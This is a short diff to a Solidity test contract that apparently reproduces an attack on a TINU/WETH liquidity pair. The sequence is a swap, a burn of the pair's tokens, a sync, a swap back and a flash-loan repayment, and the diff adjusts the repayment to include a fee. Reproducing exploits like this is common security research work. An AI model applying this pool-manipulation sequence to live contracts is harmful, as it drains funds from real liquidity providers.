@@ -179,13 +179,13 @@ contract TINUTest is Test, BlockLoader {
         printBalance("After step0 ");
         swap_pair_weth_tinu(weth.balanceOf(attacker));
         printBalance("After step1 ");
-        burn_pair_tinu(100 ether);
+        burn_pair_tinu(100e18);
         printBalance("After step2 ");
         sync_pair();
         printBalance("After step3 ");
         swap_pair_tinu_weth(tinu.balanceOf(attacker));
         printBalance("After step4 ");
-        payback_weth(22e18);
+        payback_weth((22e18 * 1003) / 1000);
         printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
     }
